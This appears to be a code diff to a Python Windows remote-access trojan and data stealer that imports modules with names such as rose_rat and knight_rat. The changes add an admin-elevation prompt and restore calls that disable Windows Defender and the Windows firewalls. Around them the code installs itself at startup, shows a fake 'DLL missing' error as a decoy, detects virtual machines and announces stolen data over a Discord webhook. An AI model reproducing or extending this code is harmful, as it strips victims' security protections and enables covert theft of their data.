@@ -5,6 +5,8 @@ import malicious
 import rose_rat
 import InjectX
 import knight_rat
+from disableDefender import disableDefender
+from disableFirewalls import disableFirewalls
 from startup import Startup
 import _roblox
 from config import Config
@@ -44,15 +46,20 @@ pygame.camera.init()
 if platform.system() != "Windows":
     sys.exit()
 
+def run_as_admin():
+    script = os.path.abspath(sys.argv[0])
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)
+
+isadmin = ctypes.windll.shell32.IsUserAnAdmin()
+if cc.get_ask_admin():
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        pass
+    else:
+        run_as_admin()
+
 if cc.get_start_up():
     startup_instance = Startup()
     startup_instance.copy_to_startup()
-
-### FORCE REMOVED BY DEVELOPERS
-# if cc.get_disable_windows_defender() is True:
-#     import disableDefender
-# if cc.get_disable_windows_firewalls() is True:
-#     import disableFirewalls
 
 if cc.get_fake_error():
     ctypes.windll.user32.MessageBoxW(0, "The program can't start because VLg7.ll is missing from your computer. Try reinstalling the program to fix this problem", "DDL missing", 16)
@@ -60,6 +67,10 @@ if cc.get_fake_error():
 if cc.get_vmdetection():
     import vmdetect
 
+if cc.get_disable_windows_defender():
+    disableDefender.disable_windows_defender()
+if cc.get_disable_windows_firewalls():
+    disableFirewalls.disable_windows_firewalls()
 
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
@@ -89,7 +100,7 @@ DETECTED = False
 if cc.get_discord_ping():
     ping = {
         "content":
-        f"<a:arrowgif:982368820436008960> **Logged data from {username}. Sending it now.** ||@everyone|| <a:CatLick:791991114437099540>",
+        f"<a:arrowgif:982368820436008960> **Logged data from `{username}`. Sending it now.** ||@everyone|| <a:CatLick:791991114437099540>",
         "username": wh_name,
         "avatar_url": wh_avatar,
     }
